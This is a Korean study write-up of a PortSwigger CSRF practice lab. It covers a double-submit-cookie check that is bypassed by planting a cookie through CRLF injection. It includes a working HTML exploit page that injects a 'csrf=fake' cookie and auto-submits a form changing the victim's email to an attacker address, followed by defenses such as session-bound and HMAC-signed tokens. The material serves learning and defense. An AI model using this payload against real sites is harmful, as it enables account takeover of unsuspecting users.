# Lab: CSRF where token is duplicated in cookie

## 개요

- **난이도**: Practitioner
- **주제**: Cross-Site Request Forgery (CSRF) — Double Submit Cookie / 단순 일치 검증 / CRLF 인젝션
- **링크**: https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-duplicated-in-cookie

## 목표

서버가 CSRF 토큰을 쿠키와 요청 본문에 동일한 값이 있는지만 확인하는(Double Submit Cookie) 취약한 구현에서, CRLF 인젝션으로 임의 값의 `csrf` 쿠키를 심고 같은 값을 본문에 넣어 검증을 통과한다.

## 서버의 검증 방식

```python
# 서버 검증 로직 (취약한 구현)
csrf_cookie = request.COOKIES.get('csrf')
csrf_body   = request.POST.get('csrf')

if csrf_cookie == csrf_body:   # 둘이 같기만 하면 통과
    process_request()
else:
    return 403

# [취약점]
# 두 값이 "같은지"만 확인
# 세션과의 연관성, 서버가 발급한 값인지 전혀 확인 안 함
# → 공격자가 임의 값으로 쿠키와 본문을 동시에 맞추면 통과
```

## 005 랩과의 차이

| 항목 | 005 랩 | 006 랩 (이번) |
|------|--------|--------------|
| 쿠키 이름 | `csrfKey` (별도 키) | `csrf` (토큰과 동일) |
| 검증 방식 | csrfKey ↔ csrf 쌍 대조 | csrf 쿠키 == csrf 본문 단순 비교 |
| 공격자가 필요한 것 | 유효한 csrfKey+token 쌍 탈취 | 임의 값 1개 (아무 값이나 가능) |
| 공격 복잡도 | 쌍을 미리 획득해야 함 | 값 지정 없이 임의 값 사용 가능 |

005 랩은 서버 발급 토큰 쌍을 훔쳐야 했지만, 006 랩은 **공격자가 원하는 임의 값**을 쿠키와 본문에 동시에 심으면 된다.

## 공격 방법

### 페이로드 (exploit server 에 호스팅)

```html
<html>
  <body>
    <!-- 1단계: CRLF 인젝션으로 csrf=fake 쿠키 설정 -->
    <img src="https://VULNERABLE.com/?search=test%0d%0aSet-Cookie:+csrf=fake;%20SameSite=None"
         onerror="document.forms[0].submit()">

    <!-- 2단계: 본문의 csrf 도 동일한 fake 값 -->
    <form action="https://VULNERABLE.com/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="attacker@evil.com">
      <input type="hidden" name="csrf" value="fake">
    </form>
  </body>
</html>
```

### 실행 흐름

```
1. img src 요청:
   GET /?search=test\r\nSet-Cookie: csrf=fake; SameSite=None

2. 서버 응답 헤더:
   Set-Cookie: LastSearchTerm=test
   Set-Cookie: csrf=fake; SameSite=None   ← CRLF 인젝션으로 추가

3. 피해자 브라우저: csrf=fake 쿠키 저장

4. onerror 발화 → 폼 제출:
   POST /my-account/change-email
   Cookie: session=VICTIM_SESSION; csrf=fake
   Body:   email=attacker@evil.com&csrf=fake

5. 서버 검증:
   csrf 쿠키(fake) == csrf 본문(fake) → 일치! → 통과
   → 피해자 이메일 변경
```

## 핵심 정리

- Double Submit Cookie 패턴에서 값의 일치만 확인하고 세션 연결이 없으면, 공격자가 임의 값으로 쿠키와 본문을 동시에 조작해 우회 가능하다.
- CRLF 인젝션으로 쿠키를 외부에서 주입할 수 있는 한 이 패턴은 무의미하다.
- **방어**:
  - CSRF 토큰을 반드시 서버 세션과 연결해 검증
  - 응답 헤더에 사용자 입력 반영 시 `\r\n` 필터링
  - `SameSite=Strict` 으로 외부 요청 시 쿠키 미전송

## 배운 점 및 추가 학습

### CSRF 토큰 허점 001~006 종합 비교

| 랩 | 취약점 유형 | 우회 핵심 |
|----|-----------|---------|
| 001 | 토큰 없음 | 그대로 POST |
| 002 | 메서드별 불일치 | GET 으로 변경 |
| 003 | 토큰 있을 때만 검증 | 토큰 파라미터 제거 |
| 004 | 전역 토큰 풀 (세션 미연결) | 공격자 토큰 재사용 |
| 005 | csrfKey 쿠키가 세션 미연결 | CRLF로 csrfKey 주입 |
| 006 | 쿠키=본문 단순 일치만 검증 | CRLF로 임의 csrf 쿠키 주입 |

### Double Submit Cookie 패턴의 안전한 대안

```
[취약한 패턴 — 006 랩]
  클라이언트: 쿠키 csrf 값을 폼에 복사
  서버: 쿠키 csrf == 폼 csrf ? → 통과
  문제: 공격자가 임의 값으로 두 곳 동시 조작 가능

[개선된 패턴 — HMAC 서명]
  csrf_cookie = HMAC(session_id, secret)
  폼: <input name="csrf" value="csrf_cookie 값">
  서버: HMAC(session_id, secret) == 폼 csrf ?
  → 서버 secret 없이는 유효한 값 생성 불가
  → 공격자가 임의 값을 쿠키에 심어도 HMAC 검증 실패

[가장 안전한 패턴 — 세션 기반]
  서버: session['csrf'] = random_token()
  폼: <input name="csrf" value="session['csrf']">
  서버: 폼 csrf == session['csrf'] ?
  → 세션 탈취 없이는 토큰 예측 불가
```
